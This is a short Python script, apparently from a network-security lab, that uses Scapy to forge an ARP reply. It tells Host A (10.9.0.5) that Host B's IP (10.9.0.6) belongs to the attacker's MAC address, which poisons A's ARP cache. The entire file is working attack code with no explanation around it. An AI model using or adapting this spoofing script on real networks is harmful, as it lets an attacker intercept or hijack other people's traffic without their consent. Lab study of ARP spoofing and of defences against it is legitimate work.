#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP packets
E = Ether()
A = ARP()

fake_MAC = "02:42:0a:09:00:69"      # Attacker's MAC
target_MAC = "02:42:0a:09:00:05"    # Host A's MAC
victim_IP = "10.9.0.6"              # Host B's IP
target_IP = "10.9.0.5"              # Host A's IP

# Set values for Ethernet and ARP Reply packets
E.src = fake_MAC
E.dst = target_MAC                  # Send to A's MAC directly

A.psrc = victim_IP                  # Pretend to be B (B's IP)
A.hwsrc = fake_MAC                  # Attacker's MAC
A.pdst = target_IP                  # A's IP (target)
A.hwdst = target_MAC                # A's MAC (target)
A.op = 2                            # ARP reply

# Combine both the Ethernet and ARP packets
pkt = E / A

# Send the ARP reply packet
sendp(pkt)
